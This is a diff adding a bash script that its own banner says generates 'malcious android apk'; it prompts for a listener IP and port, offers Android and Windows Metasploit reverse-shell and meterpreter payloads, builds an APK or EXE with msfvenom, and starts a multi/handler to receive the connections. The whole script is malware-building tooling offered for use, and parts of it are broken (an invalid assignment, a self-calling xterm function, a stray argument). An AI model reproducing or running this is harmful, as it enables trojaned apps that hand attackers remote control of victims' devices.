@@ -1,0 +1,124 @@
+#!/bin/bash
+
+echo "*************************************************************************"
+echo " ------------------------------------------------------------------------"
+echo " |       Well come to the abuugida melkam-cyber                         |"
+echo " |                                                                      |"
+echo " |                                                                      |"
+echo " |     Use this bash software to generate                               |"
+echo " |                                                                      |"
+echo " |             malcious android apk                                     |"
+echo " ------------------------------------------------------------------------"
+echo "*************************************************************************"
+
+
+dir = $(pwd)
+function apache_svc_start()
+{
+ service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+function apache_svc_stop()
+{
+ service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+#function postgresql service
+function postgresql_start()
+{
+ service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+function postgresql_stop()
+{
+ service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+
+function get_lhost() 
+{
+  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
+}
+#function lport
+function get_lport() 
+{
+  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
+}
+function payload_name()
+{
+ apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: abugida" --entry --entry-text "malcious-app" --width 300 2> /dev/null)
+}
+#function payload
+function get_payload()
+{
+  PAYLOAD=$(zenity --list --title " Abugida cyber" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
+}
+function get_payload1()
+{
+  PAYLOAD=$(zenity --list --title " Abugida cyber" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "windows/shell/reverse_tcp" FALSE "windows/shell/reverse_http" FALSE "windows/shell/reverse_https" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter_reverse_tcp" FALSE "windows/meterpreter_reverse_http" FALSE "windows/meterpreter_reverse_https" FALSE "windows/meterpreter_reverse_ipv6_tcp " --width 400 --height 400 2> /dev/null)
+}
+
+function xterm()
+{
+xterm -T "Abugida malcious app MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
+} 
+#function spinlong ()
+#{
+ #   bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+  #  barlength=${#bar}
+   # i=0
+    #while ((i < 100)); do
+     #   n=$((i*barlength / 100))
+      #  printf "\e[00;32m\r[%-${barlength}s]\e[00m\n" "${bar:0:n}"
+       # ((i += RANDOM%5+2))
+        #sleep 0.02
+ #   done
+#}
+function main()
+{
+    while :
+    do
+
+                   
+                        echo -e "[1], Generate apk\n "
+                        echo -e "[2], Generate Malcious Computer apps\n "
+                        echo -e "[e], exit\n "
+
+read -p "What is your choice:" choice
+
+                             case "$choice" in
+                             1) echo -e "well we are generating your apk "
+                                                            
+                                  get_lhost
+                                  get_lport
+                                  payload_name
+                                  get_payload 
+                                  #spinlong
+                               #spinlong
+                                 apache_svc_start
+                                 #spinlong
+                                 sleep 2
+                                # spinlong
+                                 postgresql_start
+                                 #spinlong
+                                 sleep 2
+                                  sudo msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk 
+                                  xterm
+                               ;;
+                             2) echo -e "Well we are generting Your Malcious Software"
+                                  get_lhost
+                                  get_lport
+                                  payload_name
+                                  get_payload1
+                                  #spinlong
+                               #spinlong
+                                 apache_svc_start
+                                # spinlong
+                                 sleep 2
+                                 #spinlong
+                                 postgresql_start
+                                 #spinlong
+                                 sleep 2
+                                  sudo msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f exe -o $apk_name.exe
+                                  xterm
+        esac
+    done
+}
+#spinlong
+main
